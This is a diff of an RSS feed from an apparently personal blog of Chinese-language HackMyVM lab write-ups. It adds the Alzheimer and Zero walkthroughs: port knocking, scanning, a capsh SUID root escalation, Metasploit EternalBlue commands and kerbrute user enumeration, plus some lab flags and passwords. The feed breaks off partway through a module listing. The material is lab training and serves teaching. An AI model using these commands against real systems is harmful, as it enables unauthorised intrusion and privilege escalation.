@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 30 Dec 2024 12:57:25 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 30 Dec 2024 12:56:35 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[Misc]]></title><description><![CDATA[ 
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 30 Dec 2024 13:03:28 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 30 Dec 2024 13:02:37 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[Misc]]></title><description><![CDATA[ 
  <br><br>hashcat破解就行了<br>$6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrkH8bA8W7kC3GK4CctGrFO7.E2va7kSgF3eQXNWYQee.:reddragon
 
 Session..........: hashcat
@@ -721,105 +721,7 @@ root
 root@debian:~# cat /root/root.txt
 BoFsavetheworld
 
-<br>最后，其实这里也可以用 pwnkit 漏洞进行内核提权]]></description><link>https://www.c1trus.top/24-渗透/hmv/48.deba.html</link><guid isPermaLink="false">24-渗透/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Alzheimer]]></title><description><![CDATA[ 
- <br><br>
-<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
-<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-<br><a data-tooltip-position="top" aria-label="3. ftp匿名登录" data-href="#3. ftp匿名登录" href="https://www.c1trus.top/about:blank#3._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">3. ftp匿名登录</a>
-<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
-<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Alzheimer
-<br>作者：sml
-<br>难度：死题
-<br>知识点：knock命令、SUID提权（capsh）
-<br><br>端口扫描<br>┌──(root㉿kali)-[/home/kali]
-└─# nmap -sS 192.168.9.11 -p 1-65535
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:23 CST
-Nmap scan report for 192.168.9.11
-Host is up (0.00034s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT   STATE    SERVICE
-21/tcp open     ftp
-22/tcp filtered ssh
-80/tcp filtered http
-MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
-<br>对80 22进行了限制<br><br>ftp 192.168.9.11
-anonymous
-<br>里面有一个.secretnote.txt 文件<br>查看<br>cat .secretnote.txt 
-I need to knock this ports and 
-one door will be open!
-1000
-2000
-3000
-Ihavebeenalwayshere!!!
-<br>解密 <br>意思是我们需要访问这3000个端口 然后就会有一个服务打开<br>依次访问这些端口<br>knock 192.168.9.11 1000 2000 3000 -v
-<br>然后重新扫描一下<br>┌──(root㉿kali)-[/home/kali]
-└─# nmap -sS 192.168.9.11 -p 1-65535
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:30 CST
-Nmap scan report for 192.168.9.11
-Host is up (0.00023s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
-<br>可以发现22 80都开放了<br>访问网站<br>啥都没有<br>直接扫目录<br>┌──(root㉿kali)-[/home/kali]
-└─# gobuster dir -u http://192.168.9.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.9.11/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/home                 (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/home/]
-/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/admin/]
-/secret               (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/secret/]
-Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
-<br>
-敲了半天开不了门。目录访问不了。后面看wp发现是网卡问题
-<br>这里直接给flag<br>root@alzheimer:~# cat /root/root.txt
-HMVlovememories
-root@alzheimer:~# cat /home/medusa/user.txt
-HMVrespectmemories
-root@alzheimer:~# 
-<br>还是看下题目的考点吧。<br>敲门成功后访问网站根目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" referrerpolicy="no-referrer"><br>下面应该是一个摩斯密码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.002.png" referrerpolicy="no-referrer"><br>OTHINGM
-<br>这个应该就是medusa的密码了<br>但是是不对的<br>继续看网站的其他目录<br>admin目录是空的<br>home目录下的文件提示我们pass在Home目录，但不是这个home目录<br>secret目录提示我们密码在这个secret目录的某个目录下<br>那密码就是在/secret/home目录<br>/secret/home目录的文件给了个啥用没有的提示<br>根目录给我们说他将密码写入了一个.txt文件<br>到目前为止，唯一获取到的.txt文件就是.secretnote.txt<br>I need to knock this ports and 
-one door will be open!
-1000
-2000
-3000
-Ihavebeenalwayshere!!!
-<br>里面的Ihavebeenalwayshere!!! 就是medusa的密码<br><br>虽然flag有了，但还是看看提权部分吧<br>拿到用户medusa的权限后<br>medusa@alzheimer:/root$ find / -perm -4000  2&gt;/dev/null
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/usr/bin/chsh
-/usr/bin/sudo
-/usr/bin/mount
-/usr/bin/newgrp
-/usr/bin/su
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/umount
-/usr/bin/gpasswd
-/usr/sbin/capsh
-<br>capsh --gid=0 --uid=0 --
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/9.alzheimer.html</link><guid isPermaLink="false">24-渗透/HMV/9.Alzheimer.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[8.BaseME]]></title><description><![CDATA[ 
+<br>最后，其实这里也可以用 pwnkit 漏洞进行内核提权]]></description><link>https://www.c1trus.top/24-渗透/hmv/48.deba.html</link><guid isPermaLink="false">24-渗透/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[8.BaseME]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -917,7 +819,105 @@ User lucas may run the following commands on baseme:
     (ALL) NOPASSWD: /usr/bin/base64
 lucas@baseme:~$ 
 <br>sudo base64 "/root/root.txt" |base64 --decode
-<br>这里应该读取私钥然后连接<br>我这里直接偷懒读取flag了]]></description><link>https://www.c1trus.top/24-渗透/hmv/8.baseme.html</link><guid isPermaLink="false">24-渗透/HMV/8.BaseME.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Hommie]]></title><description><![CDATA[ 
+<br>这里应该读取私钥然后连接<br>我这里直接偷懒读取flag了]]></description><link>https://www.c1trus.top/24-渗透/hmv/8.baseme.html</link><guid isPermaLink="false">24-渗透/HMV/8.BaseME.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Alzheimer]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+<br><a data-tooltip-position="top" aria-label="3. ftp匿名登录" data-href="#3. ftp匿名登录" href="https://www.c1trus.top/about:blank#3._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">3. ftp匿名登录</a>
+<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
+<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Alzheimer
+<br>作者：sml
+<br>难度：死题
+<br>知识点：knock命令、SUID提权（capsh）
+<br><br>端口扫描<br>┌──(root㉿kali)-[/home/kali]
+└─# nmap -sS 192.168.9.11 -p 1-65535
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:23 CST
+Nmap scan report for 192.168.9.11
+Host is up (0.00034s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE    SERVICE
+21/tcp open     ftp
+22/tcp filtered ssh
+80/tcp filtered http
+MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
+<br>对80 22进行了限制<br><br>ftp 192.168.9.11
+anonymous
+<br>里面有一个.secretnote.txt 文件<br>查看<br>cat .secretnote.txt 
+I need to knock this ports and 
+one door will be open!
+1000
+2000
+3000
+Ihavebeenalwayshere!!!
+<br>解密 <br>意思是我们需要访问这3000个端口 然后就会有一个服务打开<br>依次访问这些端口<br>knock 192.168.9.11 1000 2000 3000 -v
+<br>然后重新扫描一下<br>┌──(root㉿kali)-[/home/kali]
+└─# nmap -sS 192.168.9.11 -p 1-65535
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:30 CST
+Nmap scan report for 192.168.9.11
+Host is up (0.00023s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
+<br>可以发现22 80都开放了<br>访问网站<br>啥都没有<br>直接扫目录<br>┌──(root㉿kali)-[/home/kali]
+└─# gobuster dir -u http://192.168.9.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.9.11/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/home                 (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/home/]
+/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/admin/]
+/secret               (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/secret/]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+<br>
+敲了半天开不了门。目录访问不了。后面看wp发现是网卡问题
+<br>这里直接给flag<br>root@alzheimer:~# cat /root/root.txt
+HMVlovememories
+root@alzheimer:~# cat /home/medusa/user.txt
+HMVrespectmemories
+root@alzheimer:~# 
+<br>还是看下题目的考点吧。<br>敲门成功后访问网站根目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" referrerpolicy="no-referrer"><br>下面应该是一个摩斯密码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.002.png" referrerpolicy="no-referrer"><br>OTHINGM
+<br>这个应该就是medusa的密码了<br>但是是不对的<br>继续看网站的其他目录<br>admin目录是空的<br>home目录下的文件提示我们pass在Home目录，但不是这个home目录<br>secret目录提示我们密码在这个secret目录的某个目录下<br>那密码就是在/secret/home目录<br>/secret/home目录的文件给了个啥用没有的提示<br>根目录给我们说他将密码写入了一个.txt文件<br>到目前为止，唯一获取到的.txt文件就是.secretnote.txt<br>I need to knock this ports and 
+one door will be open!
+1000
+2000
+3000
+Ihavebeenalwayshere!!!
+<br>里面的Ihavebeenalwayshere!!! 就是medusa的密码<br><br>虽然flag有了，但还是看看提权部分吧<br>拿到用户medusa的权限后<br>medusa@alzheimer:/root$ find / -perm -4000  2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/sbin/capsh
+<br>capsh --gid=0 --uid=0 --
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/9.alzheimer.html</link><guid isPermaLink="false">24-渗透/HMV/9.Alzheimer.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Hommie]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 1.信息收集" data-href="#2. 1.信息收集" href="https://www.c1trus.top/about:blank#2._1.信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 1.信息收集</a>
@@ -7081,7 +7081,175 @@ SMB         192.168.56.17   445    SIMPLE           [-] Simple\marcos:SuperPassw
 被西班牙语的键盘和操作系统恶心到了🤮
 <br>SIMPLE{ASPXT0SH311}
 <br>SIMPLE{S31MP3R50N4T3PR1V1L363}
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/25.simple.html</link><guid isPermaLink="false">24-渗透/HMV/25.Simple.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[24.liar]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/25.simple.html</link><guid isPermaLink="false">24-渗透/HMV/25.Simple.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[23.Zero]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+<br><a data-tooltip-position="top" aria-label="3. 获取一个AD用户" data-href="#3. 获取一个AD用户" href="https://www.c1trus.top/about:blank#3._获取一个AD用户" class="internal-link" target="_self" rel="noopener nofollow">3. 获取一个AD用户</a>
+
+<br><a data-tooltip-position="top" aria-label="3.1. SMB空会话检测" data-href="#3.1. SMB空会话检测" href="https://www.c1trus.top/about:blank#3.1._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMB空会话检测</a>
+<br><a data-tooltip-position="top" aria-label="3.2. kerbrute爆破用户" data-href="#3.2. kerbrute爆破用户" href="https://www.c1trus.top/about:blank#3.2._kerbrute爆破用户" class="internal-link" target="_self" rel="noopener nofollow">3.2. kerbrute爆破用户</a>
+
+
+<br><a data-tooltip-position="top" aria-label="4. 再打MS17-010" data-href="#4. 再打MS17-010" href="https://www.c1trus.top/about:blank#4._再打MS17-010" class="internal-link" target="_self" rel="noopener nofollow">4. 再打MS17-010</a>
+<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Zero
+<br>作者：[ruycr4ft](https://hackmyvm.eu/profile/?user=ruycr4ft)
+<br>难度：⭐️
+<br>知识点：MS17-010
+<br><br> fscan -h 192.168.56.15
+
+   \_\_\_                              \_
+  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
+ / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
+/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
+\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
+                     fscan version: 1.8.4
+start infoscan
+192.168.56.15:445 open
+192.168.56.15:139 open
+192.168.56.15:135 open
+192.168.56.15:88 open
+[\*] alive ports len is: 4
+start vulscan
+[+] MS17-010 192.168.56.15      (Windows Server 2016 Standard Evaluation 14393)
+[\*] NetBios 192.168.56.15   [+] DC:DC01.zero.hmv                 Windows Server 2016 Standard Evaluation 14393
+[\*] NetInfo
+[\*]192.168.56.15
+   [-&gt;]DC01
+   [-&gt;]192.168.56.15
+已完成 4/4
+[\*] 扫描结束,耗时: 3.061390899s
+
+┌──(root㉿kali)-[/home/kali/hmv/Zero]
+└─# nmap -sC -sV 192.168.56.15 -T4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 07:06 CST
+Nmap scan report for 192.168.56.15
+Host is up (0.00015s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-20 22:37:00Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup:
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn\_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
+3269/tcp open  tcpwrapped
+MAC Address: 08:00:27:CB:14:11 (Oracle VirtualBox virtual NIC)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:cb:14:11 (Oracle Virtual NIC)
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3
+|   Computer name: DC01
+|   NetBIOS computer name: DC01\x00
+|   Domain name: zero.hmv
+|   Forest name: zero.hmv
+|   FQDN: DC01.zero.hmv
+|\_  System time: 2024-11-20T14:37:01-08:00
+|\_clock-skew: mean: 2h09m55s, deviation: 4h37m07s, median: -30m04s
+| smb-security-mode:
+|   account\_used: guest
+|   authentication\_level: user
+|   challenge\_response: supported
+|\_  message\_signing: required
+| smb2-time:
+|   date: 2024-11-20T22:37:01
+|\_  start\_date: 2024-11-20T22:35:17
+| smb2-security-mode:
+|   3:1:1:
+|\_    Message signing enabled and required
+<br>配置/etc/hosts<br>192.168.56.15 DC01.zero.hmv  zero.hmv
+<br>发现有永恒之蓝。<br>直接上msf打一波看看<br>use exploit/windows/smb/ms17\_010\_eternalblue
+set payload windows/x64/meterpreter/bind\_tcp\_uuid
+set rhosts 172.22.11.45
+run
+<br>直接给靶机干蓝屏了。重新利用好像不行了。<br>还是正常打吧。<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/Zero]
+└─# smbmap -u guest -H zero.hmv
+
+    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
+   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
+  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
+   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
+    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
+   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
+  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\*] Detected 1 hosts serving SMB
+[\*] Established 0 SMB session(s)
+<br>没有<br><br>┌──(root㉿kali)-[/home/kali/hmv/Zero]
+└─# kerbrute userenum -d zero.hmv -t 100 --dc DC01.zero.hmv /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid\_user.txt
+
+    \_\_             \_\_               \_\_
+   / /\_\_\_\_\_  \_\_\_\_\_/ /\_  \_\_\_\_\_\_\_  \_\_/ /\_\_\_\_
+  / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
+ / ,&lt; /  \_\_/ /  / /\_/ / /  / /\_/ / /\_/  \_\_/
+/\_/|\_|\\_\_\_/\_/  /\_.\_\_\_/\_/   \\_\_,\_/\\_\_/\\_\_\_/
+
+Version: v1.0.3 (9dad6e1) - 11/21/24 - Ronnie Flathers @ropnop
+
+2024/11/21 07:23:00 &gt;  Using KDC(s):
+2024/11/21 07:23:00 &gt;   DC01.zero.hmv:88
+
+2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       administrator@zero.hmv
+2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       Administrator@zero.hmv
+2024/11/21 07:26:17 &gt;  [+] VALID USERNAME:       dc01@zero.hmv
+2024/11/21 07:27:35 &gt;  Done! Tested 8295455 usernames (3 valid) in 275.149 seconds
+<br>也没有什么东西<br><br>msf里面可不止一种MS17-010的利用<br>msf6 &gt; search ms17
+
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank     Check  Description
+   -   ----                                                  ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17\_010\_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \\_ target: Automatic Target                         .                .        .      .
+   2     \\_ target: Windows 7                                .                .        .      .
+   3     \\_ target: Windows Embedded Standard 7              .                .        .      .
+   4     \\_ target: Windows Server 2008 R2                   .                .        .      .
+   5     \\_ target: Windows 8                                .                .        .      .
+   6     \\_ target: Windows 8.1                              .                .        .      .
+   7     \\_ target: Windows Server 2012                      .                .        .      .
+   8     \\_ target: Windows 10 Pro                           .                .        .      .
+   9     \\_ target: Windows 10 Enterprise Evaluation         .                .        .      .
+   10  exploit/windows/smb/ms17\_010\_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \\_ target: Automatic                                .                .        .      .
+   12    \\_ target: PowerShell                               .                .        .      .
+   13    \\_ target: Native upload                            .                .        .      .
+   14    \\_ target: MOF upload                               .                .        .      .
+   15    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
+   16    \\_ AKA: ETERNALROMANCE                              .                .        .      .
+   17    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
+   18    \\_ AKA: ETERNALBLUE                                 .                .        .      .
+   19  auxiliary/admin/smb/ms17\_010\_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
+   21    \\_ AKA: ETERNALROMANCE                              .                .        .      .
+   22    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
+   23    \\_ AKA: ETERNALBLUE                                 .                .        .      .
+   24  auxiliary/scanner/smb/smb\_ms17\_010                    .                normal   No     MS17-010 SMB RCE Detection
+   25    \\_ AKA: DOUBLEPULSAR                                .                .        .      .
+   26    \\_ AKA: ETERNALBLUE                                 .                .        .      .
+   27  exploit/windows/fileformat/office\_ms17\_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
